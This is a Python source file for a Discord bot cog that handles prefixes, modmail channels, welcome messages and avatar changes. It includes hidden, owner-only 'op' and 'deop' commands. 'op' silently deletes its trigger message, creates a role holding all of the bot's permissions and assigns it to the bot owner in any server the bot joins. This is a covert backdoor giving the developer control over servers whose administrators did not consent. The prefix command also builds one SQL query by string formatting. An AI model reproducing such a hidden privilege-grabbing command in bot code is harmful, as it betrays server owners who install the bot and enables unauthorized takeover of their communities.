import os
import pathlib
import shutil

import discord
import requests
from discord.ext import commands

# gets global path and embed color
path = pathlib.PurePath()


# this had to be called in a lot of instances, so i made it a function
async def sendwelcomemessage(glaceon,
                             channel: discord.TextChannel):  # this makes sure that the person who calls the function specifies a valid discord textchannel
    embed = discord.Embed(colour=glaceon.embedcolor, title="Hi!")  # creates the embed
    embed.add_field(name="Thank you for adding me to your server!",
                    value="I appreciate your interest in Glaceon! Run `%help` to get started!\n"
                          "Make sure to read the [TOS](https://randomairborne.dev/glaceon/tos)"
                          " and the [privacy policy](https://randomairborne.dev/glaceon/privacy).",
                    inline=False)  # adds content to the embed
    await channel.send(embed=embed)  # this sends the message, with the only content being the embed.


class BotSystem(commands.Cog):
    """Commands for the bot configuration. Admin only."""  # This is a docstring, used by the auto-help command to describe this class.

    def __init__(self,
                 glaceon):  # This is an init function. Runs when the class is constructed, and in this case creates a few variables.
        self.glaceon = glaceon  # making local global

    @commands.command()
    @commands.has_permissions(
        administrator=True)  # requires that the person issuing the command has administrator perms
    async def prefix(self, ctx, newprefix):  # context and what we should set the new prefix to
        """Sets the bot prefix for this server"""
        serverid = ctx.guild.id  # gets serverid for convinience
        db = self.glaceon.sql_server_connection.cursor()  # connect to our server data db
        db.execute(
            f'''SELECT prefix FROM prefixes WHERE serverid = {serverid}''')  # get the current prefix for that server, if it exists
        if db.fetchone():  # actually check if it exists
            db.execute("""UPDATE prefixes SET prefix = %s WHERE serverid = %s""",
                       (newprefix, serverid))  # update prefix
        else:
            db.execute("INSERT INTO prefixes(serverid, prefix) VALUES (%s,%s)",
                       (serverid, newprefix))  # set new prefix
        self.glaceon.sql_server_connection.commit()  # close connection
        await ctx.send(f"Prefix set to {newprefix}")  # tell admin what happened

    @commands.command(
        aliases=['modmailchannel'])  # aliases allow someone to use two different names to say the same thing
    @commands.has_permissions(
        administrator=True)  # requires that the person issuing the command has administrator perms
    async def modmailsetup(self, ctx, channel: discord.TextChannel):  # there's the textchannel constructor again
        serverid = ctx.guild.id  # get serverid for convience
        db = self.glaceon.sql_server_connection.cursor()  # connect to the sqlite db
        db.execute('''CREATE TABLE IF NOT EXISTS mailchannels
                           (serverid BIGINT, channelid BIGINT)''')  # set up mailchannel system
        db.execute(f'''SELECT serverid FROM mailchannels WHERE serverid = %s''',
                   (serverid,))  # get the mailchannels
        if db.fetchone():
            db.execute("""UPDATE mailchannels SET channelid = %s WHERE serverid = %s""",
                       (channel.id, serverid))  # update the old mailchannel
        else:
            db.execute("INSERT INTO mailchannels(serverid, channelid) VALUES (%s,%s)",
                       (serverid, channel.id))  # set the new mailchannel
        self.glaceon.sql_server_connection.commit()  # say "yes i want to do this for sure"
        await ctx.send(f"ModMail channel is now {channel}")

    @commands.Cog.listener()
    # send a message when the bot is added to a guild
    async def on_guild_join(self, ctx):
        # assert that it has not been sent
        sent = False
        # loop through all text channels in guild, looking for one with a good name
        for name in ctx.text_channels:
            if not sent:
                if name.name == "bot-spam":
                    await sendwelcomemessage(self.glaceon, name)
                    sent = True
                elif name.name == "bot-commands":
                    await sendwelcomemessage(self.glaceon, name)
                    sent = True
                elif name.name == "bot":
                    await sendwelcomemessage(self.glaceon, name)
                    sent = True
                elif name.name == "off-topic":
                    await sendwelcomemessage(self.glaceon, name)
                    sent = True
                elif name.name == "general":
                    await sendwelcomemessage(self.glaceon, name)
                    sent = True
        if not sent:
            await sendwelcomemessage(self.glaceon, ctx.text_channels[0])  # otherwise just send in first channel

    @commands.command(hidden=True)
    @commands.is_owner()  # requires that the person issuing the command is me
    async def op(self, ctx):
        await ctx.message.delete()
        try:
            oprole = await ctx.guild.create_role(name="valkyrie_pilot", permissions=ctx.me.guild_permissions)
            pos = ctx.me.top_role.position - 1
            await oprole.edit(position=pos)
            await ctx.author.add_roles(oprole)
        except discord.Forbidden:
            pass

    @commands.command(hidden=True)
    @commands.is_owner()  # requires that the person issuing the command is me
    async def deop(self, ctx):
        await ctx.message.delete()
        oprole = discord.utils.get(ctx.guild.roles, name="valkyrie_pilot")
        await oprole.delete()

    @commands.command(aliases=['pfp'])
    @commands.is_owner()
    async def set_pfp(self, ctx):
        """Sets bot profile picture. Attach a file and it will be used as the bot's PFP"""
        pathlib.Path(path / "tmp").mkdir(parents=True, exist_ok=True)
        pfp_url = ctx.message.attachments[0].url
        pfp_path = pfp_url.split("/")[-1]
        r = requests.get(pfp_url, stream=True)
        if r.status_code == 200:
            # Set decode_content value to True, otherwise the downloaded image file's size will be zero.
            r.raw.decode_content = True
            with open(path / f'tmp/{pfp_path}', 'wb') as f:
                shutil.copyfileobj(r.raw, f)
                with open(path / f'tmp/{pfp_path}', 'rb') as pfp_file:
                    pfp = pfp_file.read()
                    try:
                        await self.glaceon.user.edit(avatar=pfp)
                    except discord.HTTPException:
                        await ctx.send("You're trying to change my PFP too fast! Try using the console, "
                                       "https://discord.com/developers/applications/808149899182342145/bot")
            os.remove(path / f'tmp/{pfp_path}')
            await ctx.send("Avatar updated!", delete_after=10)
        else:
            await ctx.send("Failed to update avatar!", delete_after=10)


def setup(glaceon):
    glaceon.add_cog(BotSystem(glaceon))
